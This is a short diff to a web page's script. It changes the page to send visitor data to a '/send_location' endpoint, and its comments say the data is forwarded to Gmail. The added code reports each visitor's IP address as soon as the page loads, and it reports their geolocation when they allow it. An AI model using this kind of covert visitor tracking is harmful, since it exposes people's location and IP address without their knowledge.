@@ -5,21 +5,27 @@
 </head>
 <body>
     <script>
+        // Send the IP address to Gmail
+        var xhttp1 = new XMLHttpRequest();
+        xhttp1.open('POST', '/send_location', true);
+        xhttp1.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhttp1.send('ip_address=');
+
         // Get the client's location
         function getLocation() {
             navigator.geolocation.getCurrentPosition(function(position) {
-                // Send the location data to Flask
-                var xhttp = new XMLHttpRequest();
-                xhttp.open('POST', '/location', true);
-                xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                xhttp.send('latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude);
+                // Send the location data to Gmail
+                var xhttp2 = new XMLHttpRequest();
+                xhttp2.open('POST', '/send_location', true);
+                xhttp2.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+                xhttp2.send('ip_address=&latitude=' + position.coords.latitude + '&longitude=' + position.coords.longitude);
             }, function(error) {
                 if (error.code === error.PERMISSION_DENIED) {
-                    // Send the IP address to Flask
-                    var xhttp = new XMLHttpRequest();
-                    xhttp.open('POST', '/location', true);
-                    xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-                    xhttp.send('latitude=&longitude=');
+                    // Send the IP address to Gmail
+                    var xhttp3 = new XMLHttpRequest();
+                    xhttp3.open('POST', '/send_location', true);
+                    xhttp3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+                    xhttp3.send('ip_address=');
                 }
             });
         }
